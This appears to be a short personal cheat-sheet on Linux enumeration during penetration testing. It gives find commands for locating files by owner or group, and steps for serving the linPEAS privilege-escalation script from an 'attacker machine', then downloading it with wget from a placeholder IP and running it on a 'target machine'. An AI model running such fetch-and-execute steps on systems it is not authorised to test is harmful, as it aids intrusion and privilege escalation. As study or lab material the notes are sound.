# Linux Enumeration

## Reading all Files

```bash
cat */*
```

## Find Command

[https://unix.stackexchange.com/questions/159244/find-files-belonging-to-a-group](https://unix.stackexchange.com/questions/159244/find-files-belonging-to-a-group)  
```bash
find / -group groupX
```
  
[https://unix.stackexchange.com/questions/22747/finding-files-by-their-owner-and-file-permissions](https://unix.stackexchange.com/questions/22747/finding-files-by-their-owner-and-file-permissions)  
```bash
find / -user user
```

## Linpeas
Install Linpeas from [GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Placing it in `~/Documents/enum` allows you to easily retrieve it with a simple python server. See [[Aliases#Useful Aliases]] for `enumserve` alias setup.

On attacker machine:

```bash
enumserve
```

Find your IP address ([[Linux Networking#Get your IP]])

On target machine:

```bash
wget [IP]:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```